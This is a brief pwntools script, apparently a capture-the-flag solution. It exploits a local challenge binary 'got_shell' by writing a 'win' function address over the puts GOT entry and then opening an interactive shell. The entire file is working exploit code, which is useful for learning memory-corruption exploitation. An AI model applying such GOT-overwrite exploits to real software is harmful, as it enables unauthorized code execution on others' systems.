from pwn import *

context.log_level = "debug"

p = process('./got_shell')

puts_got = "0000000000404000"
win = "0000000000401176"


p.recvuntil("value: ")
p.sendline(puts_got)
p.recvuntil("0x404000: ")
p.sendline(win)
p.interactive()